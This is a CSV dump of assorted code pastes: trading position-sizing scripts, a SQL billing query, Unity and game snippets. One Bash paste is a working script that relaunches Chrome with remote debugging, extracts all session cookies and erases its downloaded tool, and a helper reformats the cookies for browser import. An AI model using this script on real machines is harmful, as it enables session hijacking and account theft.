id,title,username,language,date,content
TLg4SWGJ,UnoRubber_IO.ino,FlyFar,Arduino,Monday 24th of July 2023 09:19:38 AM CDT,"/* Copyright (c) 2017 Andrea Fioraldi
 *
 * License http://opensource.org/licenses/mit-license.php MIT License
 */

 void setup() {}

void loop() {}"
yraAyRFL,format_for_editthiscookie.sh,FlyFar,Bash,Monday 24th of July 2023 09:17:40 AM CDT,"#! /bin/bash

# Filters out just the field we're interested in from Chrome's response, and also removes leading `.` characters from domain names (e.g. `.google.com` -> `google.com`, which is needed for EditThisCookie)
jq '.result.cookies' | sed -E 's/""\./""/'"
z3ZQfj6J,cookie_crimes_macos.sh,FlyFar,Bash,Monday 24th of July 2023 09:17:01 AM CDT,"#! /bin/bash

# Prints out the cookies for the currently open Chrome window. This will cause Chrome to close and then suddenly re-open when run. Not very stealthy, oops.

# Download websocat from github to make the websocket request.
WEBSOCAT_URL=""https://github.com/vi/websocat/releases/download/v1.5.0/websocat_mac""
CHROME=""/Applications/Google Chrome.app/Contents/MacOS/Google Chrome""
USER_DATA_DIR=""$HOME/Library/Application Support/Google/Chrome""
WEBSOCAT_PATH=""$USER_DATA_DIR/websocat""
COOKIE_PATH=""$USER_DATA_DIR/Cookies""

# Download websocat
curl -sL ""$WEBSOCAT_URL"" -o ""$WEBSOCAT_PATH""
chmod +x ""$WEBSOCAT_PATH""

# Kill Chrome, and wait for the process to terminate.
pkill Chrome 2>&1 >/dev/null && while pgrep Chrome >/dev/null;
    do false;
done;

# Start a new Chrome with  remote debugging enabled, restoring the previous session.
""$CHROME"" --user-data-dir=""$USER_DATA_DIR"" --remote-debugging-port=9222 --crash-dumps-dir=""$USER_DATA_DIR"" --restore-last-session 2>/dev/null 1>/dev/null &

# Wait for Remote Debugging to be available
while true; do
    curl -s 127.0.0.1:9222/json 2>&1 > /dev/null && break;
done;


# Make the websocket request and print the cookies to stdout.
while true; do
    echo 'Network.getAllCookies' | ""$WEBSOCAT_PATH"" -n1 --jsonrpc -B 50000000 $(curl -sg http://127.0.0.1:9222/json | grep webSocketDebuggerUrl | cut -d'""' -f4 | head -1) 2>/dev/null && break
done;

# Delete websocat, leaving no trace, like a leaf on the wind.
rm ""$WEBSOCAT_PATH"""
QtPyHnqk,Untitled,drestrepo,MySQL,Monday 24th of July 2023 08:55:22 AM CDT,"SELECT buz.buzID AS id_asunto,
                             REPLACE(REPLACE(cmr.cmrName,'"".'""'.""',''),'\n', ' ') AS cliente,
                             REPLACE(REPLACE(pcs.pcsDsc,'"".'""'.""',''),'\n', ' ') AS asunto,
                             REPLACE(REPLACE(pa.name,'"".'""'.""',''),'\n', ' ') AS area_practica,
                             imo.imoDsc AS forma_facturacion,
                             IF(buz.buzStatus = 1, 'Activo', 'Inactivo') AS estado_asunto,
                             pgs.pgsDateWork AS fecha_tiempo,
                             pgs.pgsHourRate AS tarifa_tiempo,
                             u.fname AS usuario,
                             (SELECT ur.roll_description
                              FROM user_roll ur
                              WHERE ur.user_roll_id = u.id_user_roll) AS categoria,
                             IF(pgs.pgsInvoiceble = 1, pgs.pgsMinutsWork/60, 0) AS tiempo_facturable,
                             IF(pgs.pgsInvoiceble = 1, pgs.pgsTotal, 0) AS valor_tiempo_facturable,
                             IF(pgs.pgsInvoiceble = 2, pgs.pgsMinutsWork/60, 0) AS tiempo_no_facturable,
                             IF(pgs.pgsInvoiceble = 2, pgs.pgsTotal, 0) AS valor_tiempo_no_facturable,
                             CASE
                                WHEN buz.buzImoID = 2 THEN (SELECT grp.grpMonthlyFixRate
                                                            FROM tmc_group_tbl_grp grp
                                                            WHERE grp.grpID = buz.buzOnly)
                                WHEN buz.buzImoID = 3 THEN buz.buzMonthlyFixRate
                                WHEN buz.buzImoID = 4 AND h.byHours = 0 THEN h.monthlyFixRate
                                WHEN buz.buzImoID = 5 THEN (SELECT grp.grpMonthlyFixRate
                                                            FROM tmc_group_tbl_grp grp
                                                            WHERE grp.grpID = buz.buzOnly)
                                WHEN buz.buzImoID = 6 THEN buz.buzMonthlyFixRate
                                ELSE 0
                             END AS valor_monto_fijo,
                             (SELECT grp.grpID
                              FROM tmc_group_tbl_grp grp
                              WHERE grp.grpID = buz.buzOnly
                              ) AS grupo_monto_fijo_mes,
                             (SELECT ucrcv.rate
                              FROM user_cost_rates ucr
                              INNER JOIN user_cost_rates_currency_values ucrcv ON (ucrcv.user_cost_rate_id = ucr.id)
                              WHERE ucrcv.currency_id = pgs.pgsCurID AND
                              ucr.user_rol_id = u.id_user_roll AND
                              ucr.year = YEAR(pgs.pgsDateWork)
                              ) *
                             pgs.pgsMinutsWork/60 AS costo_usuario,
                             IF(buz.buzImoID IN (2,3) , (buz.buzLimitHours/60), 0) AS limite_horas,
                             cur.curShort AS moneda_asunto,
                             (SELECT GROUP_CONCAT(u2.fname)
                              FROM origination_partners_businesses opb
                              INNER JOIN users u2 ON (opb.user_id = u2.id)
                              WHERE opb.business_id = buz.buzID) AS socio_originador,
                             (SELECT u3.fname
                              FROM users u3
                              WHERE buz.buzResponsable = u3.id) AS responsable_facturacion,
                             (SELECT u4.fname
                              FROM users u4
                              WHERE buz.responsible_partner = u4.id) AS socio_responsable,
                             pgs.pgsInvID AS id_documento,
                             (SELECT s.serie_short_name
                              FROM tmi_invoice_tbl_inv inv
                              LEFT JOIN series s ON (inv.serie_id = s.id)
                              WHERE inv.invID = pgs.pgsInvID) AS serie,
                             (SELECT inv.invOficialNum
                              FROM tmi_invoice_tbl_inv inv
                              WHERE inv.invID = pgs.pgsInvID) AS numero_documento,
                             (SELECT inv.invDate
                              FROM tmi_invoice_tbl_inv inv
                              WHERE inv.invID = pgs.pgsInvID) AS fecha_emision,
                             (SELECT CONCAT(s.serie_short_name,inv.invOficialNum)
                              FROM tmi_invoice_tbl_inv inv
                              LEFT JOIN series s ON (inv.serie_id = s.id)
                              WHERE inv.invID = pgs.pgsInvID) AS documento,
                             (SELECT GROUP_CONCAT(pa.name)
                              FROM practice_areas pa
                              INNER JOIN usuarios_areas ua ON (pa.id_practice_area = ua.practice_area_id)
                              WHERE ua.usuario_id = pgs.pgsProID) AS area_practica_usuario,
                             pgs.status_marking AS estado_tiempo,
                             pgs.pgsID AS id_tiempo,
                             pgs.pgsMinuts - pgs.pgsMinutsWork AS ajuste_tiempo,
                             REPLACE(REPLACE(pgs.pgsDetails,'"".'""'.""',''),'\n', ' ') AS descripcion_tiempo,
                             (SELECT ucrcv.rate 
                              FROM user_cost_rates ucr
                              INNER JOIN user_cost_rates_currency_values ucrcv ON (ucr.id = ucrcv.user_cost_rate_id)
                              WHERE ucr.year = YEAR(pgs.pgsDateWork) AND
                                    ucrcv.currency_id = pgs.pgsCurID AND
                                    ucr.user_rol_id = u.id_user_roll
                             ) AS costo_usuario,
                             pgs.pgsProID AS id_usuario
                      FROM tmc_progress_tbl_pgs pgs
                      INNER JOIN tmc_business_rel_buz buz ON (pgs.pgsBuzID = buz.buzID)
                      INNER JOIN tmc_customers_tbl_cmr cmr ON (buz.buzCmrID = cmr.cmrID)
                      INNER JOIN tmc_process_tbl_pcs pcs ON (buz.buzPcsID = pcs.pcsID)
                      INNER JOIN tmc_currency_tbl_cur cur ON (buz.buzCurID = cur.curID)
                      INNER JOIN tmi_invoicemode_tbl_imo imo ON (buz.buzImoID = imo.imoID)
                      INNER JOIN users u ON (pgs.pgsProID = u.id)
                      LEFT JOIN hitos h ON (pgs.id_hito = h.id)
                      LEFT JOIN practice_areas pa ON (buz.practice_area_id = pa.id_practice_area)
                      WHERE pgs.pgsBuzID = buz.buzID AND
                            pgs.pgsStatus NOT IN (2,5)"
8TQD2Awv,Indicatore Funzione QTA Money Management,Maurizio-Ciullo,JavaScript,Monday 24th of July 2023 08:36:44 AM CDT,"//						   ***** CODICE PINESCRIPT A FINE PAGINA *****                                 //

// --------------------------------------------------- INIZIO ORIGINALE QTA INDICATORE FUNZIONE MONEY MANAGEMENT EASY LANGUAGE --------------------------------------------------- //



{***************************************
* Funzione: CalcPosSize
* 
* Questa funzione calcola la dimensione della posizione da utilizzare per gli ordini di trading.
* Il calcolo e' basato sul metodo di money management specificato dall'input MM_Method:
* 
* 0 - Fixed Contracts: Usa un numero fisso di contratti specificato dall'input FixedContracts.
* 1 - Fixed Fractional Method: Usa una frazione del profitto netto per determinare la dimensione della posizione. 
*     La frazione e' specificata dall'input RiskFraction e lo stop loss dall'input sl.
* 2 - PercentFVolatility: Usa una percentuale della volatilita' del mercato (calcolata come l'Average True Range) per determinare la dimensione della posizione. 
*     Il rischio monetario specificato dall'input Monetary_Risk viene diviso per l'ATR moltiplicato per il valore del punto grande.
* 
* Gli input Min_Contract e Max_Contract vengono utilizzati per limitare la dimensione della posizione calcolata nel caso PercentVolatility.
* 
* L'input Period_ATR e' il periodo utilizzato per calcolare l'ATR nel caso PercentVolatility.
* 
* Per utilizzare questa funzione, chiamala all'interno della tua strategia, passando i parametri appropriati. Ad esempio:
* 
* vars: myPosSize(0);
* myPosSize = CalcPosSize(MM_Method, FixedContracts, RiskFraction, Period_ATR, Min_Contract, Max_Contract, Monetary_Risk);
* 
* Puoi quindi utilizzare la variabile myPosSize per i tuoi ordini. Ad esempio:
* 
* buy myPosSize contracts next bar at market;
****************************************}

// Se si crea uno script funzione su easylanguage allora usare (numericSimple) 

{inputs: MM_Method(numericSimple), 
        FixedContracts(numericSimple), 
        RiskFraction(numericSimple), 
        Period_ATR(numericSimple), 
        Min_Contract(numericSimple), 
        Max_Contract(numericSimple), 
        Monetary_Risk(numericSimple);}
        
// Se si crea uno signal su easylanguage allora usare (numero input)        
        
inputs: MM_Method(1), 
        FixedContracts(1), 
        RiskFraction(25), 
        Period_ATR(14), 
        Min_Contract(1),
        Max_Contract(100), 
        Monetary_Risk(200);
        
vars: posSize(0), ATRValue(0);

if MM_Method = 0 then begin // Fixed Contracts
    posSize = FixedContracts;
end 
else if MM_Method = 1 then begin // Fixed Fractional Method
    posSize = ((RiskFraction/100) * NetProfit) / Monetary_Risk;
    if posSize < 1 then posSize = 1; 
end 
else if MM_Method = 2 then begin // Percent Volatility
	ATRValue = AvgTrueRange(Period_ATR);
	
	if (ATRValue * bigpointvalue) > 0 then
		posSize = Monetary_Risk / (ATRValue * BigPointValue);
	
end;

posSize = Round(posSize, 0);

if posSize > Max_Contract then 
   posSize = Max_Contract
else if posSize < Min_Contract then 
   posSize = Min_Contract;

// CalcolaPositionSize = posSize; // !!! ATTENZIONE DECOMMENTARE SE SI CREAI UNO SCRIPT EASYLANGUAGE DI TIPO FUNZIONE !!! .


// --------------------------------------------------- FINE ORIGINALE QTA INDICATORE FUNZIONE MONEY MANAGEMENT EASY LANGUAGE --------------------------------------------------- //






// --------------------------------------------------- INIZIO MODIFICATO PER VARIE PROVE --------------------------------------------------- //

{***************************************
* Funzione: CalcPosSize
* 
* Questa funzione calcola la dimensione della posizione da utilizzare per gli ordini di trading.
* Il calcolo e' basato sul metodo di money management specificato dall'input MM_Method:
* 
* 0 - Fixed Contracts: Usa un numero fisso di contratti specificato dall'input FixedContracts.
* 1 - Fixed Fractional Method: Usa una frazione del profitto netto per determinare la dimensione della posizione. 
*     La frazione e' specificata dall'input RiskFraction e lo stop loss dall'input sl.
* 2 - PercentFVolatility: Usa una percentuale della volatilita' del mercato (calcolata come l'Average True Range) per determinare la dimensione della posizione. 
*     Il rischio monetario specificato dall'input Monetary_Risk viene diviso per l'ATR moltiplicato per il valore del punto grande.
* 
* Gli input Min_Contract e Max_Contract vengono utilizzati per limitare la dimensione della posizione calcolata nel caso PercentVolatility.
* 
* L'input Period_ATR e' il periodo utilizzato per calcolare l'ATR nel caso PercentVolatility.
* 
* Per utilizzare questa funzione, chiamala all'interno della tua strategia, passando i parametri appropriati. Ad esempio:
* 
* vars: myPosSize(0);
* myPosSize = CalcPosSize(MM_Method, FixedContracts, RiskFraction, Period_ATR, Min_Contract, Max_Contract, Monetary_Risk);
* 
* Puoi quindi utilizzare la variabile myPosSize per i tuoi ordini. Ad esempio:
* 
* buy myPosSize contracts next bar at market;
****************************************}

        
{inputs: MM_Method(1), 
        FixedContracts(1), 
        RiskFraction(25), 
        Period_ATR(14), 
        Min_Contract(1), 
        Max_Contract(100), 
        Monetary_Risk(200),
        Initial_Capital(100000);    
 

        
vars: posSize(0), ATRValue(0), CalcolaPositionSize(0);

if MM_Method = 0 then begin // Fixed Contracts
    posSize = FixedContracts;
end 
else if MM_Method = 1 then begin // Fixed Fractional Method
    posSize = ((RiskFraction/100) * (Initial_Capital + NetProfit)) / Close;// / Monetary_Risk;  // Se lo voglio includere Monetary_Risk lo includo altrimewnti niente
    if posSize < 1 then posSize = 1; 
end 
else if MM_Method = 2 then begin // Percent Volatility
	ATRValue = AvgTrueRange(Period_ATR);
	
	if (ATRValue * bigpointvalue) > 0 then
		posSize = Monetary_Risk / (ATRValue * BigPointValue);
	 
end;

posSize = Round(posSize, 0);

if posSize > Max_Contract then 
   posSize = Max_Contract
else if posSize < Min_Contract then 
   posSize = Min_Contract;

CalcolaPositionSize = posSize;

print(posSize);


// Entry / Exit condition Long
if (close > open and close[1] > open[1]) then 

begin;
      Buy(""Entry_long"") posSize contracts next bar at market;
end;

if (close < open and close[1] < open[1]) then
begin;
      Sell(""Exit_long"") from entry(""Entry_long"") next bar at market;
end;}

// --------------------------------------------------- FINE MODIFICATO PER VARIE PROVE --------------------------------------------------- //




// --------------------------------------------------- INIZIO ORIGINALE QTA INDICATORE FUNZIONE MONEY MANAGEMENT PINESCRIPT --------------------------------------------------- //


{MM_Method = input(0, ""MM_Method"")
FixedContracts = input(1, ""FixedContracts"")
RiskFraction = input(1, ""RiskFraction"")
Period_ATR = input(14, ""Period_ATR"")
Min_Contract = input(1, ""Min_Contract"")
Max_Contract = input(100, ""Max_Contract"")
Monetary_Risk = input(1, ""Monetary_Risk"")

posSize = 0.0
ATRValue = ta.atr(Period_ATR)

if (MM_Method == 0)
    posSize := FixedContracts
else if (MM_Method == 1)
    posSize := ((RiskFraction / 100) * na) / Monetary_Risk
else if (MM_Method == 2)
    if (ATRValue * close) > 0
        posSize := Monetary_Risk / (ATRValue * close)
    
posSize := math.round(posSize)

if posSize > Max_Contract
    posSize := Max_Contract
else if posSize < Min_Contract
    posSize := Min_Contract}


// --------------------------------------------------- FINE ORIGINALE QTA INDICATORE FUNZIONE MONEY MANAGEMENT PINESCRIPT --------------------------------------------------- //










"
egMmHwdz,Indicatore Funzione QTA Money Management,Maurizio-Ciullo,JavaScript,Monday 24th of July 2023 08:33:18 AM CDT,"// --------------------------------------------------- INIZIO ORIGINALE QTA INDICATORE FUNZIONE MONEY MANAGEMENT EASY LANGUAGE --------------------------------------------------- //



{***************************************
* Funzione: CalcPosSize
* 
* Questa funzione calcola la dimensione della posizione da utilizzare per gli ordini di trading.
* Il calcolo e' basato sul metodo di money management specificato dall'input MM_Method:
* 
* 0 - Fixed Contracts: Usa un numero fisso di contratti specificato dall'input FixedContracts.
* 1 - Fixed Fractional Method: Usa una frazione del profitto netto per determinare la dimensione della posizione. 
*     La frazione e' specificata dall'input RiskFraction e lo stop loss dall'input sl.
* 2 - PercentFVolatility: Usa una percentuale della volatilita' del mercato (calcolata come l'Average True Range) per determinare la dimensione della posizione. 
*     Il rischio monetario specificato dall'input Monetary_Risk viene diviso per l'ATR moltiplicato per il valore del punto grande.
* 
* Gli input Min_Contract e Max_Contract vengono utilizzati per limitare la dimensione della posizione calcolata nel caso PercentVolatility.
* 
* L'input Period_ATR e' il periodo utilizzato per calcolare l'ATR nel caso PercentVolatility.
* 
* Per utilizzare questa funzione, chiamala all'interno della tua strategia, passando i parametri appropriati. Ad esempio:
* 
* vars: myPosSize(0);
* myPosSize = CalcPosSize(MM_Method, FixedContracts, RiskFraction, Period_ATR, Min_Contract, Max_Contract, Monetary_Risk);
* 
* Puoi quindi utilizzare la variabile myPosSize per i tuoi ordini. Ad esempio:
* 
* buy myPosSize contracts next bar at market;
****************************************}

// Se si crea uno script funzione su easylanguage allora usare (numericSimple) 

{inputs: MM_Method(numericSimple), 
        FixedContracts(numericSimple), 
        RiskFraction(numericSimple), 
        Period_ATR(numericSimple), 
        Min_Contract(numericSimple), 
        Max_Contract(numericSimple), 
        Monetary_Risk(numericSimple);}
        
// Se si crea uno signal su easylanguage allora usare (numero input)        
        
inputs: MM_Method(1), 
        FixedContracts(1), 
        RiskFraction(25), 
        Period_ATR(14), 
        Min_Contract(1),
        Max_Contract(100), 
        Monetary_Risk(200);
        
vars: posSize(0), ATRValue(0);

if MM_Method = 0 then begin // Fixed Contracts
    posSize = FixedContracts;
end 
else if MM_Method = 1 then begin // Fixed Fractional Method
    posSize = ((RiskFraction/100) * NetProfit) / Monetary_Risk;
    if posSize < 1 then posSize = 1; 
end 
else if MM_Method = 2 then begin // Percent Volatility
	ATRValue = AvgTrueRange(Period_ATR);
	
	if (ATRValue * bigpointvalue) > 0 then
		posSize = Monetary_Risk / (ATRValue * BigPointValue);
	
end;

posSize = Round(posSize, 0);

if posSize > Max_Contract then 
   posSize = Max_Contract
else if posSize < Min_Contract then 
   posSize = Min_Contract;

// CalcolaPositionSize = posSize; // !!! ATTENZIONE DECOMMENTARE SE SI CREAI UNO SCRIPT EASYLANGUAGE DI TIPO FUNZIONE !!! .


// --------------------------------------------------- FINE ORIGINALE QTA INDICATORE FUNZIONE MONEY MANAGEMENT EASY LANGUAGE --------------------------------------------------- //






// --------------------------------------------------- INIZIO MODIFICATO PER VARIE PROVE --------------------------------------------------- //

{***************************************
* Funzione: CalcPosSize
* 
* Questa funzione calcola la dimensione della posizione da utilizzare per gli ordini di trading.
* Il calcolo e' basato sul metodo di money management specificato dall'input MM_Method:
* 
* 0 - Fixed Contracts: Usa un numero fisso di contratti specificato dall'input FixedContracts.
* 1 - Fixed Fractional Method: Usa una frazione del profitto netto per determinare la dimensione della posizione. 
*     La frazione e' specificata dall'input RiskFraction e lo stop loss dall'input sl.
* 2 - PercentFVolatility: Usa una percentuale della volatilita' del mercato (calcolata come l'Average True Range) per determinare la dimensione della posizione. 
*     Il rischio monetario specificato dall'input Monetary_Risk viene diviso per l'ATR moltiplicato per il valore del punto grande.
* 
* Gli input Min_Contract e Max_Contract vengono utilizzati per limitare la dimensione della posizione calcolata nel caso PercentVolatility.
* 
* L'input Period_ATR e' il periodo utilizzato per calcolare l'ATR nel caso PercentVolatility.
* 
* Per utilizzare questa funzione, chiamala all'interno della tua strategia, passando i parametri appropriati. Ad esempio:
* 
* vars: myPosSize(0);
* myPosSize = CalcPosSize(MM_Method, FixedContracts, RiskFraction, Period_ATR, Min_Contract, Max_Contract, Monetary_Risk);
* 
* Puoi quindi utilizzare la variabile myPosSize per i tuoi ordini. Ad esempio:
* 
* buy myPosSize contracts next bar at market;
****************************************}

        
{inputs: MM_Method(1), 
        FixedContracts(1), 
        RiskFraction(25), 
        Period_ATR(14), 
        Min_Contract(1), 
        Max_Contract(100), 
        Monetary_Risk(200),
        Initial_Capital(100000);    
 

        
vars: posSize(0), ATRValue(0), CalcolaPositionSize(0);

if MM_Method = 0 then begin // Fixed Contracts
    posSize = FixedContracts;
end 
else if MM_Method = 1 then begin // Fixed Fractional Method
    posSize = ((RiskFraction/100) * (Initial_Capital + NetProfit)) / Close;// / Monetary_Risk;  // Se lo voglio includere Monetary_Risk lo includo altrimewnti niente
    if posSize < 1 then posSize = 1; 
end 
else if MM_Method = 2 then begin // Percent Volatility
	ATRValue = AvgTrueRange(Period_ATR);
	
	if (ATRValue * bigpointvalue) > 0 then
		posSize = Monetary_Risk / (ATRValue * BigPointValue);
	 
end;

posSize = Round(posSize, 0);

if posSize > Max_Contract then 
   posSize = Max_Contract
else if posSize < Min_Contract then 
   posSize = Min_Contract;

CalcolaPositionSize = posSize;

print(posSize);


// Entry / Exit condition Long
if (close > open and close[1] > open[1]) then 

begin;
      Buy(""Entry_long"") posSize contracts next bar at market;
end;

if (close < open and close[1] < open[1]) then
begin;
      Sell(""Exit_long"") from entry(""Entry_long"") next bar at market;
end;}

// --------------------------------------------------- FINE MODIFICATO PER VARIE PROVE --------------------------------------------------- //




// --------------------------------------------------- INIZIO ORIGINALE QTA INDICATORE FUNZIONE MONEY MANAGEMENT PINESCRIPT --------------------------------------------------- //


{MM_Method = input(0, ""MM_Method"")
FixedContracts = input(1, ""FixedContracts"")
RiskFraction = input(1, ""RiskFraction"")
Period_ATR = input(14, ""Period_ATR"")
Min_Contract = input(1, ""Min_Contract"")
Max_Contract = input(100, ""Max_Contract"")
Monetary_Risk = input(1, ""Monetary_Risk"")

posSize = 0.0
ATRValue = ta.atr(Period_ATR)

if (MM_Method == 0)
    posSize := FixedContracts
else if (MM_Method == 1)
    posSize := ((RiskFraction / 100) * na) / Monetary_Risk
else if (MM_Method == 2)
    if (ATRValue * close) > 0
        posSize := Monetary_Risk / (ATRValue * close)
    
posSize := math.round(posSize)

if posSize > Max_Contract
    posSize := Max_Contract
else if posSize < Min_Contract
    posSize := Min_Contract}


// --------------------------------------------------- FINE ORIGINALE QTA INDICATORE FUNZIONE MONEY MANAGEMENT PINESCRIPT --------------------------------------------------- //










"
iYzamtQv,邀您一起看：主页设置,xiaomianao666,JavaScript,Monday 24th of July 2023 08:32:56 AM CDT,海阔视界规则分享，当前分享的是：二级页面详情￥page_detail￥主页设置@@eyJkYXRhIjoie1wiYXNzb2NpYXRlZE1vZGVsc01hcEZvckpvaW5UYWJsZVwiOnt9LFwiYXNzb2NpYXRlZE1vZGVsc01hcFdpdGhGS1wiOnt9LFwiYXNzb2NpYXRlZE1vZGVsc01hcFdpdGhvdXRGS1wiOnt9LFwiZmllbGRzVG9TZXRUb0RlZmF1bHRcIjpbXSxcImdtdE1vZGlmaWVkXCI6MCxcImlkXCI6MCxcImxhc3RfY2hhcHRlcl9ydWxlXCI6XCJcIixcImxpc3RUb0NsZWFyQXNzb2NpYXRlZEZLXCI6W10sXCJsaXN0VG9DbGVhclNlbGZGS1wiOltdLFwicGFnZUxpc3RcIjpbXSxcInNhdmVkXCI6ZmFsc2UsXCJ0aXRsZVwiOlwi5oiR55qE5Li76aG1XCIsXCJ2ZXJzaW9uXCI6MCxcInVybFwiOlwiaGlrZXI6Ly9lbXB0eSNub1JlY29yZEhpc3RvcnkjO2dldDtVVEYtODt7VXNlci1BZ2VudEBNb3ppbGxhLzUuMCAoTGludXjvvJvvvJsgQW5kcm9pZCAxMe+8m++8myBNaSAxMCBQcm8pIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS84OC4wLjQzMjQuMTUyIE1vYmlsZSBTYWZhcmkvNTM3LjM2fVwiLFwiY29sX3R5cGVcIjpcImljb25fc21hbGxfNFwiLFwiZmluZF9ydWxlXCI6XCJqczpldmFsKGZldGNoKCdoaWtlcjovL2Fzc2V0cy9ob21lLmpzJyx7fSkpO0hpa2VySG9tZS5sb2FkKCdzZXR1cHBhZ2UnKVwiLFwiZ3JvdXBcIjpcIuKRpPCfpYzlqLHkuZBcIixcInVhXCI6XCJtb2JpbGVcIixcInByZVJ1bGVcIjpcIlwiLFwicGFnZXNcIjpcIltdXCJ9IiwicGljVXJsIjoiaGlrZXI6Ly9maWxlcy9pY29uL1N0aGVtZS9za2lucy8xL+S4u+mhteiuvue9ri5zdmciLCJ0aXRsZSI6IuS4u+mhteiuvue9riJ9
uY2hy4Xc,GA4 - app - flutter - search,filipr27,Dart,Monday 24th of July 2023 08:03:07 AM CDT,"// search
await firebaseAnalytics.logEvent(
  name: ""search"",
  parameters: {
    ""search_term"": stan zemun,  // all lowercase
    ""visitorStatus"": prijavljen,  // prijavljen or neprijavljen
    ""business_type"": b2c,  // b2b or b2c
    ""page_category"": knjige,  // knjige, nekretnine, posao, usluge, etc, ostale stranice
  },
);"
y4LhSmgc,FlightCamera,noobHasan,C#,Monday 24th of July 2023 07:56:54 AM CDT,"using System.Collections;
using System.Collections.Generic;
using UnityEngine;

public class FlightCamera : MonoBehaviour
{
    public GameObject Target;
    public float FollowSpeedMulti = 0.5f;
    public float TurnSpeedMulti = 5f;
    public Vector3 Offset = new Vector3(10, 0.5f, 10);
    Vector3 positionTargetUp;



    // Start is called before the first frame update
    void Start()
    {

    }

    // Update is called once per frame
    void FixedUpdate()
    {
        if (!Target) return;

        transform.LookAt(Target.transform.position + Target.transform.forward * Offset.x);
        positionTargetUp = Vector3.Lerp(positionTargetUp, (-Target.transform.forward + (Target.transform.up * Offset.y)), Time.fixedDeltaTime * TurnSpeedMulti);
        Vector3 positionTarget = Target.transform.position + (positionTargetUp * Offset.z);
        float distance = Vector3.Distance(positionTarget, this.transform.position);
        this.transform.position = Vector3.Lerp(this.transform.position, positionTarget, Time.fixedDeltaTime * (distance * FollowSpeedMulti));
    }
}
"
3YJLDQ6Y,Untitled,Alcon666,Java,Monday 24th of July 2023 07:48:28 AM CDT,"iptvtools_62	https://encrypted-tbn3.gstatic.com/images?q=tbn:ANd9GcQ6yCfua9ODv5_aADPL1UybIKYrVBgLDRn5_rkb_SxXz4QXqrZRyA      	95x80
(0:1)	png	

87	 En línea	iptvtools_87	http://nws.nice264.com/jwp6/jwplayer.flash.swf   Ver una captura de pantalla   Ver transmisión en vivo	122x50
(0:1)	rawvideo	

98	 En línea	iptvtools_98	http://p.jwpcdn.com/6/10/jwplayer.flash.swf      "
W1zNMwUr,Untitled,KoctrX,JavaScript,Monday 24th of July 2023 07:47:35 AM CDT,"function terrens() {
    return setInterval(() => {
        const player = game.players[0];
        
        for(const eat of [...game.activeScene.objects.fishes, ...game.activeScene.objects.worms]) {
            player.incrementWeight(eat.params.food);
            game.audio.playSoloAudio(game.activeScene.music.eat);
            game.activeScene.appendPoop(player.fish);
            player.eatFish(eat, isPoopEnd => {
            if (isPoopEnd) {
                game.activeScene.appendPoop(player.fish);
            } else {
                game.activeScene.game.audio.playSoloAudio(game.activeScene.music.lvl_up);
            }
            });
            
            game.canvasSwal.eatInfo(eat, player);
            game.activeScene.objectEndAnimation(eat);
            // player.setupSizeByWeight();
            player.fish.eatScaleAnimation(true); 
        }
    }, 1000);
}"
